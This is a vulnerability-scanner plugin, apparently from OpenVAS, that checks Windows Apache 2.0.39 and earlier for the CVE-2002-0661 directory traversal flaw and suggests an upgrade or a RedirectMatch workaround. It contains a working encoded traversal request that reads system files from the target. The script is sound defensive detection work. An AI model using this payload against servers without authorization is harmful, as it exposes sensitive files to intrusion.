# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apache:http_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11092");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-0661");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5434");
  script_name("Apache HTTP Server 2.0.x <= 2.0.39 Win32 Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Web Servers");
  script_dependencies("gb_apache_http_server_consolidation.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("apache/http_server/http/detected", "Host/runs_windows");

  script_tag(name:"summary", value:"Apache HTTP Server is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted GET request and checks the response.");

  script_tag(name:"insight", value:"A security vulnerability in Apache 2.0.39 on Windows systems
  allows attackers to access files that would otherwise be inaccessible using a directory traversal attack.");

  script_tag(name:"impact", value:"A cracker may use this to read sensitive files or even execute any
  command on your system.");

  script_tag(name:"affected", value:"Apache HTTP Server 2.0 through 2.0.39.");

  script_tag(name:"solution", value:"Update to Apache HTTP Server version 2.0.40 or later.

  As a workaround add in the httpd.conf, before the first 'Alias' or 'Redirect' directive:

  RedirectMatch 400 \\\.\.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

files = traversal_files( "windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = str_replace( string:file, find:"/", replace:"%5c" );

  url = "/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c" + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern, check_header:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

banner = http_get_remote_headers( port:port );
if( banner && egrep( string:banner, pattern:"^Server\s*: *Apache(-AdvancedExtranetServer)?/2\.0\.[0-3][0-9]* *\(Win32\)", icase:TRUE ) ) {
  report  = '** The Scanner found that your server should be vulnerable according to\n';
  report += '** its version number but could not exploit the flaw.\n';
  report += '** You may have already applied the RedirectMatch wordaround.\n';
  report += "** Anyway, you should upgrade your server to Apache 2.0.40";
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
